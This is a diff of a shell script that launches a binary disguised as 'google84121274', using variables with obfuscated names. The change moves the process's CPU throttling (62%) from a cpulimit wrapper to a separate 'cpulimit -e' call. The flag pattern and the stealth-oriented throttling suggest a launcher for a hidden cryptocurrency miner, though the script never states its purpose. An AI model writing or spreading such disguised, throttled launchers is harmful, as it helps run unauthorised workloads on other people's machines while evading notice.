@@ -57,7 +57,9 @@ googlelinux84=$(echo "$count / 16384"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
-cpulimit -l 62 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+
+cpulimit -e google84121274 -l 62
 
 else
 
@@ -102,7 +104,9 @@ googlelinux84=$(echo "$count / 524288"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
-cpulimit -l 62 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+
+cpulimit -e google84121274 -l 62
 
 fi
 
